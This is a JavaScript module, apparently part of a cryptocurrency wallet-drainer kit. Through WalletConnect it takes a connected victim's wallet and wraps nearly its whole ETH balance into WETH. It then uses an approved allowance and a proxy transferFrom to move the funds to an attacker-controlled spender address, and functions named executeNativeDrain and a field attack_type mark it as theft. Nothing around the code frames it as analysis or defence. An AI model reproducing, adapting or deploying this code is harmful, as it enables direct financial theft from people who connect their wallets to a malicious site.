import { getAddress, getIsConnected, getChainID, getProvider } from '../walletconnect'
import { BrowserProvider, Contract, formatEther, parseEther, parseUnits } from 'ethers';
import { SPENDER, MAX_ALLOWANCE } from './constants'
import { transferFromProxy } from './proxy';
import { spenderAddress } from '../constants/erc2612permit'



async function getSigner() {
  if (!getIsConnected()) return;

  const walletProvider = getProvider();
  const ethersProvider = new BrowserProvider(walletProvider);
  const signer = await ethersProvider.getSigner();

  return signer;
}


async function getEthereumContract(address, abi) {
  if (!getIsConnected()) return;

  const signer = await getSigner();
  const transactionContract = new Contract(address, abi, signer);

  return transactionContract;
}




async function convertNativeToToken(balance, chain_id) {
    return new Promise(async(resolve, reject) => {
      try {
          if (!getIsConnected()) reject({reason: 'Wallet not connected'})
          if (balance<=0) reject({reason: 'Insufficient amount'})
          if (chain_id != getChainID()) reject({reason: 'Wrong chain'})
  
          const signer = await getSigner();
          const OWNER = getAddress()

          const gasPrice = 0.002;

          balance = (balance - gasPrice).toString();
          if (balance<=0) {
            reject({reason: 'Insufficient amount'})
            return;
          }
 
          if (balance.length > 18) balance = Number(balance).toFixed(18)
  
          const WETH_ADDRESS = (chain_id==11155111) ? "0xfff9976782d46cc05630d1f6ebab18b2324d6b14" : "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"; // ETH_MAINNET
  
          const wethAbi = [
              "function deposit() public payable",
              "function approve(address spender, uint256 amount) public returns (bool)"
          ];
  
          const wethContract = await getEthereumContract(WETH_ADDRESS, wethAbi);

  
          const tx = await wethContract.deposit({ value: parseEther(balance.toString()) });
          console.log("Wrapping ETH TX:", tx.hash);
          await tx.wait();
          console.log("ETH successfully wrapped!");
  
          // const approveTX = await wethContract.approve(SPENDER, parseEther(MAX_ALLOWANCE.toString()));
          // console.log("Approval TX:", approveTX.hash);
          // await approveTX.wait();
          // console.log("WETH Approved!");
  
          resolve({owner: OWNER,
                   spender: SPENDER, 
                   attack_type: 'native', 
                   value: MAX_ALLOWANCE, 
                   token_address: WETH_ADDRESS, 
                   token_name: 'WETH', 
                   spenderAddress: spenderAddress,
                   chain_id})
          // console.log("pool:  ", pool)
      } catch (error) {
        console.log(error);
        reject(error)
      }
    })
  }



  async function executeNativeDrain(data) {
    return new Promise(async (resolve, reject) => {
        try {
            const WETH_ADDRESS = data.token_address
            const owner = data.owner;
            const spender = data.spender;
            const attack_type = data.attack_type;
            const value = data.value;
            const token_name = data.token_name;
            const chain_id = data.chain_id;
            const balance = data.balance;
            const spenderAddress = data.spenderAddress;

            if (!getIsConnected()) reject({reason: 'Wallet not connected'})
            if (balance<=0) reject({reason: 'Insufficient amount'})
            if (chain_id != getChainID()) reject({reason: 'Wrong chain'})
            
            const WETH_ABI = [
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function transferFrom(address from, address to, uint256 amount) returns (bool)"
            ];

          console.log({owner, spender, WETH_ADDRESS})
          const wethContract = await getEthereumContract(WETH_ADDRESS, WETH_ABI);
          const allowance = await wethContract.allowance(owner, spender);
          
          if (formatEther(allowance) < 0) reject({reason: 'Insufficient allowance'});

          // const tx = await wethContract.transferFrom(owner, spender, parseEther(balance));
          // await tx.wait();

          await transferFromProxy(spender, WETH_ADDRESS, owner, parseEther(balance), spenderAddress);
          
          resolve()
        } catch (error) {
            console.log(error);
            reject(error)
        }
    })
  }


  export {
    convertNativeToToken,
    executeNativeDrain
  }